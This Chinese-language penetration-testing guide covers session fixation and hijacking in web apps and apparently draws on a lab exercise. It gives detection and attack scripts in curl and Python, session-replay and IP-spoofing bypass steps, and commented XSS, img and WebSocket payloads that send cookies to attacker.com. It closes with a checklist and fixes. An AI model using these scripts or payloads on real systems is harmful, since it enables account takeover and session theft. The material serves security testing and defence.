# 会话固定与劫持攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的会话固定与会话劫持攻击检测与利用流程，帮助发现和利用会话管理缺陷。

## 1.2 适用范围

本文档适用于所有使用会话管理的 Web 应用，特别是：
- 使用 Cookie 会话的 Flask、Django 应用
- 登录后不更换会话 ID 的系统
- 会话超时配置不当的系统
- 登出时会话未完全失效的系统

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

**会话固定（Session Fixation）**：攻击者预先设置受害者的会话 ID，待受害者登录后，使用该会话 ID 劫持账户。

**会话劫持（Session Hijacking）**：攻击者通过窃取或预测会话 ID，冒充合法用户访问系统。

**本质问题**：
- 登录后不更换会话 ID
- 会话 ID 可预测或可伪造
- 会话未设置安全标志（Secure、HttpOnly）
- 登出时会话未完全失效

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-384 | 会话固定 |
| CWE-613 | 会话过期不足 |
| CWE-614 | Cookie 中的敏感信息 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 用户登录 | 认证流程 | 登录后会话 ID 不变 |
| 用户登出 | 退出登录 | 仅清除部分会话数据 |
| 会话管理 | Cookie 设置 | 缺少 Secure/HttpOnly 标志 |
| 多设备登录 | 并发会话 | 无会话数量限制 |
| 长期会话 | 记住我功能 | 会话永不过期 |

## 2.3 漏洞发现方法

### 2.3.1 会话固定检测

```bash
# 步骤 1：获取登录前的会话 Cookie
curl -c pre_login_cookies.txt -s http://target.com/
echo "Pre-login session:"
cat pre_login_cookies.txt | grep session

# 步骤 2：使用该会话登录
curl -b pre_login_cookies.txt -c post_login_cookies.txt \
    -X POST http://target.com/ -d "username=test" -L
curl -b post_login_cookies.txt -c post_login_cookies.txt \
    -X POST http://target.com/password/test -d "password=test" -L

# 步骤 3：比较会话 Cookie
echo "Post-login session:"
cat post_login_cookies.txt | grep session

# 如果会话 ID 未变化，存在会话固定漏洞
```

### 2.3.2 会话超时检测

```bash
# 步骤 1：登录获取会话
curl -c cookies.txt -X POST http://target.com/ -d "username=test" -L
curl -b cookies.txt -c cookies.txt -X POST http://target.com/password/test -d "password=test" -L

# 步骤 2：等待一段时间后测试会话
sleep 3600  # 等待 1 小时
curl -b cookies.txt http://target.com/dashboard

# 如果仍能访问，会话未正确过期
```

### 2.3.3 登出后会话失效检测

```bash
# 步骤 1：登录
curl -c cookies.txt -X POST http://target.com/ -d "username=test" -L
curl -b cookies.txt -c cookies.txt -X POST http://target.com/password/test -d "password=test" -L

# 步骤 2：验证登录状态
curl -b cookies.txt http://target.com/dashboard
echo "Before logout: $(echo $?)"

# 步骤 3：登出
curl -b cookies.txt -c cookies_after_logout.txt -X POST http://target.com/logout -L

# 步骤 4：使用原会话访问
curl -b cookies.txt http://target.com/dashboard
# 如果仍能访问，登出未完全失效会话
```

### 2.3.4 自动化检测脚本

```python
#!/usr/bin/env python3
"""
会话管理漏洞检测脚本
检测会话固定、会话超时、登出失效等问题
"""

import requests
import time

BASE_URL = 'http://target.com'

def test_session_fixation():
    """测试会话固定漏洞"""
    print("[*] Testing session fixation...")
    
    session = requests.Session()
    
    # 获取登录前会话
    session.get(f'{BASE_URL}/')
    pre_login_cookie = session.cookies.get('session')
    print(f"Pre-login session: {pre_login_cookie}")
    
    # 登录
    session.post(f'{BASE_URL}/', data={'username': 'test'}, allow_redirects=False)
    session.post(f'{BASE_URL}/password/test', data={'password': 'test'}, allow_redirects=False)
    
    # 获取登录后会话
    post_login_cookie = session.cookies.get('session')
    print(f"Post-login session: {post_login_cookie}")
    
    if pre_login_cookie == post_login_cookie:
        print("[VULNERABLE] Session ID not changed after login!")
        return True
    else:
        print("[SAFE] Session ID changed after login")
        return False

def test_logout_invalidation():
    """测试登出后会话失效"""
    print("\n[*] Testing logout invalidation...")
    
    session = requests.Session()
    
    # 登录
    session.post(f'{BASE_URL}/', data={'username': 'test'}, allow_redirects=False)
    session.post(f'{BASE_URL}/password/test', data={'password': 'test'}, allow_redirects=False)
    
    # 验证登录状态
    response = session.get(f'{BASE_URL}/dashboard')
    if response.status_code != 200:
        print("[-] Login failed")
        return False
    
    # 登出
    session.post(f'{BASE_URL}/logout')
    
    # 尝试使用原会话访问
    response = session.get(f'{BASE_URL}/dashboard')
    if response.status_code == 200:
        print("[VULNERABLE] Session still valid after logout!")
        return True
    else:
        print("[SAFE] Session invalidated after logout")
        return False

def test_session_timeout():
    """测试会话超时"""
    print("\n[*] Testing session timeout...")
    
    session = requests.Session()
    
    # 登录
    session.post(f'{BASE_URL}/', data={'username': 'test'}, allow_redirects=False)
    session.post(f'{BASE_URL}/password/test', data={'password': 'test'}, allow_redirects=False)
    
    # 立即测试
    response = session.get(f'{BASE_URL}/dashboard')
    print(f"Immediate access: {response.status_code}")
    
    # 等待后测试
    print("[*] Waiting 60 seconds...")
    time.sleep(60)
    
    response = session.get(f'{BASE_URL}/dashboard')
    print(f"After 60s: {response.status_code}")
    
    if response.status_code == 200:
        print("[INFO] Session persists after 60 seconds")
        # 可能需要更长时间测试

def main():
    test_session_fixation()
    test_logout_invalidation()
    test_session_timeout()

if __name__ == '__main__':
    main()
```

## 2.4 漏洞利用方法

### 2.4.1 会话固定攻击

```python
#!/usr/bin/env python3
"""
会话固定攻击脚本
1. 创建会话
2. 诱使受害者使用该会话登录
3. 劫持受害者账户
"""

import requests

BASE_URL = 'http://target.com'

def session_fixation_attack():
    """执行会话固定攻击"""
    
    # 步骤 1：攻击者创建会话
    attacker_session = requests.Session()
    attacker_session.get(f'{BASE_URL}/')
    fixation_cookie = attacker_session.cookies.get('session')
    print(f"[+] Fixation session: {fixation_cookie}")
    
    # 步骤 2：诱使受害者使用该会话登录
    # 实际攻击中，攻击者通过 XSS、MITM 等方式设置受害者 Cookie
    print(f"[!] Send this cookie to victim: {fixation_cookie}")
    
    # 步骤 3：受害者登录后，攻击者使用同一会话访问
    # 模拟受害者登录（实际攻击中是受害者自己登录）
    victim_session = requests.Session()
    victim_session.cookies.set('session', fixation_cookie)
    victim_session.post(f'{BASE_URL}/', data={'username': 'victim'}, allow_redirects=False)
    victim_session.post(f'{BASE_URL}/password/victim', data={'password': 'victim123'}, allow_redirects=False)
    
    # 步骤 4：攻击者劫持会话
    response = attacker_session.get(f'{BASE_URL}/dashboard')
    if response.status_code == 200:
        print("[SUCCESS] Session fixation attack successful!")
        print(f"Victim dashboard: {len(response.text)} bytes")
        return True
    
    return False

if __name__ == '__main__':
    session_fixation_attack()
```

### 2.4.2 会话重放攻击

```bash
# 步骤 1：捕获有效会话 Cookie
curl -c captured_session.txt -X POST http://target.com/ -d "username=test" -L
curl -b captured_session.txt -c captured_session.txt -X POST http://target.com/password/test -d "password=test" -L

# 步骤 2：在不同时间/地点重放会话
curl -b captured_session.txt http://target.com/dashboard
curl -b captured_session.txt http://target.com/orders
curl -b captured_session.txt http://target.com/order/300198/receipt
```

### 2.4.3 登出后会话重放

```python
#!/usr/bin/env python3
"""
利用登出后会话未完全失效的漏洞
"""

import requests

BASE_URL = 'http://target.com'

def replay_after_logout():
    """登出后会话重放攻击"""
    
    # 登录
    session = requests.Session()
    session.post(f'{BASE_URL}/', data={'username': 'test'}, allow_redirects=False)
    session.post(f'{BASE_URL}/password/test', data={'password': 'test'}, allow_redirects=False)
    
    # 获取会话 Cookie
    original_cookie = session.cookies.get('session')
    print(f"[+] Original session: {original_cookie}")
    
    # 登出
    session.post(f'{BASE_URL}/logout')
    print("[*] Logged out")
    
    # 使用原会话 Cookie 创建新会话
    new_session = requests.Session()
    new_session.cookies.set('session', original_cookie)
    
    # 尝试访问受保护资源
    response = new_session.get(f'{BASE_URL}/dashboard')
    if response.status_code == 200:
        print("[VULNERABLE] Dashboard accessible after logout!")
        return True
    else:
        print("[SAFE] Session properly invalidated")
        return False

if __name__ == '__main__':
    replay_after_logout()
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过会话绑定

```python
# 如果会话与 IP 绑定，尝试以下方法

# 1. 使用相同 IP（如果可能）
# 2. 尝试 X-Forwarded-For 头欺骗
headers = {
    'X-Forwarded-For': '192.168.1.100'  # 受害者 IP
}

# 3. 尝试其他绑定绕过
# 某些应用仅检查部分绑定条件
```

### 2.5.2 隐蔽会话窃取

```python
# 使用隐蔽方式窃取会话

# 1. 通过 XSS 窃取
# <script>fetch('/steal?cookie='+document.cookie)</script>

# 2. 通过子资源请求
# <img src="http://attacker.com/steal?cookie=..." />

# 3. 通过 WebSocket
# var ws = new WebSocket('ws://attacker.com/');
# ws.send(document.cookie);
```

### 2.5.3 长期会话维持

```python
# 对于无超时会话，建立持久访问

import time

def maintain_access(session_cookie):
    """维持长期访问"""
    while True:
        # 定期访问保持会话活跃
        response = requests.get(
            f'{BASE_URL}/dashboard',
            cookies={'session': session_cookie}
        )
        
        if response.status_code == 200:
            print(f"[+] Session still valid at {time.strftime('%H:%M:%S')}")
        else:
            print("[-] Session expired")
            break
        
        # 等待 5 分钟
        time.sleep(300)
```

---

# 第三部分：附录

## 3.1 会话攻击 Payload 速查表

| 攻击类型 | Payload/方法 | 说明 |
|---------|-------------|------|
| 会话固定 | 预创建会话诱使登录 | 登录后会话 ID 不变 |
| 会话劫持 | 窃取 Cookie 重放 | 会话无 IP 绑定 |
| 会话重放 | 登出后使用原 Cookie | 登出未失效会话 |
| 会话预测 | 分析会话 ID 规律 | 可预测会话 ID |

## 3.2 会话安全测试检查清单

```
□ 登录后会话 ID 是否更换
□ 登出后会话是否完全失效
□ 会话是否设置 Secure 标志
□ 会话是否设置 HttpOnly 标志
□ 会话是否设置 SameSite 标志
□ 会话是否有合理超时时间
□ 会话是否与 IP/UA 绑定
□ 并发会话数量是否限制
□ 会话 ID 是否足够随机
```

## 3.3 修复建议

1. **会话轮换** - 登录后必须更换会话 ID
2. **完全失效** - 登出时清除所有会话数据
3. **安全标志** - 设置 Secure、HttpOnly、SameSite
4. **超时机制** - 实现绝对超时和空闲超时
5. **会话绑定** - 将会话与 IP 或 User-Agent 绑定
6. **强会话 ID** - 使用足够长度的随机会话 ID

---

**文档版本**：1.0
**最后更新**：2026-03-08
**参考来源**：XBEN-002-24 渗透测试实战
